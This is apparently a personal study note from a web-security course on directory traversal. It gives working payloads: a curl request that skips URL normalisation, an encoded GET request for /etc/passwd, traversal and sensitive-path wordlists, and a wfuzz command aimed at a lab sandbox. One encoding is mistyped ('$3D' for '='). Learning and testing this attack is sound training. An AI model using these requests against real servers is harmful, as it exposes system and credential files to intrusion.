---
tags:
- directoryTraversal
---

# Directory Traversal or Path Traversal

Directory Traversal - an attack that exploits bad security validation inputs file names.

In a Windows machine, we can specify both the “../” and “..\\” traversal strings.  [[2023051318534545 Directory Traversal or Path Traversal#^3eb7f0]]

/etc/passwd analog for windows machine is **C:\Windows\win.ini**

Browser can do url normalisation [[2023051318534545 Directory Traversal or Path Traversal#^1f604a]] . So we can use burp suite or curl to do request without url normalisation. 
Example:
```bash
curl -v http://www.megacorpone.com/about.html/../index.html
```
Or we can use URL encoded symbols:

%2f - "/"
%20 - " "
$3D = "="

Sample URL encoded  GET request:
```
GET /files/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
```

## Example Directory traversal vulnerability
![[Pasted image 20230513191044.png]]
Traversal strings: `../`

![[Pasted image 20230513201756.png]]
![[Pasted image 20230513201813.png]]
## Word lists
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

Or custom word list to find location some file.
paths.txt
```
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../
```

other custom sec list:
custom_sec_list_dir_path.txt 
```
/www/logs
/www
/usr
/usr/local
/home
/var
/var/log
/var/log/news
/var/log/mysql
/var/cron
/var/www
/var/www/vhosts
/apache2
/admin
/apache2/logs
/apache/logs
/bin

/
/boot
/etc
/etc/apache2
/etc/apache2/conf
/etc/apache/conf
/etc/apache
/etc/apache2/sites-available
/etc/apache2/sites-available/default
/etc/apache/sites-available
/etc/apache/sites-available/default
/etc/defaults
/etc/httpd/conf.d
/etc/httpd/conf
/etc/httpd/logs
/etc/httpd
/etc/http
/etc/init.d
/etc/mail
/etc/mailman
/etc/mysql
/etc/opt
/etc/opt/ipf
```
## Fuzzing
Determine which file exists in directory:
```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt http://dirTravSandbox:80/relativePathing.php?path=../../../../../../../../../../FUZZ
```

[[202309061806022 Example how to find file in directory traversal]]
## References
1.  (Wikipedia, 2021), [https://en.wikipedia.org/wiki/Directory_traversal_attack](https://en.wikipedia.org/wiki/Directory_traversal_attack) [↩︎](https://portal.offsec.com/courses/web-200/books-and-videos/modal/modules/directory-traversal-attacks/directory-traversal-attacks#fnref1)
2. web200.Directory Traversal Attacks
3. web200, p. 254 ^3eb7f0
4. (Wikipedia, 2021), https://en.wikipedia.org/wiki/URI_normalization ^1f604a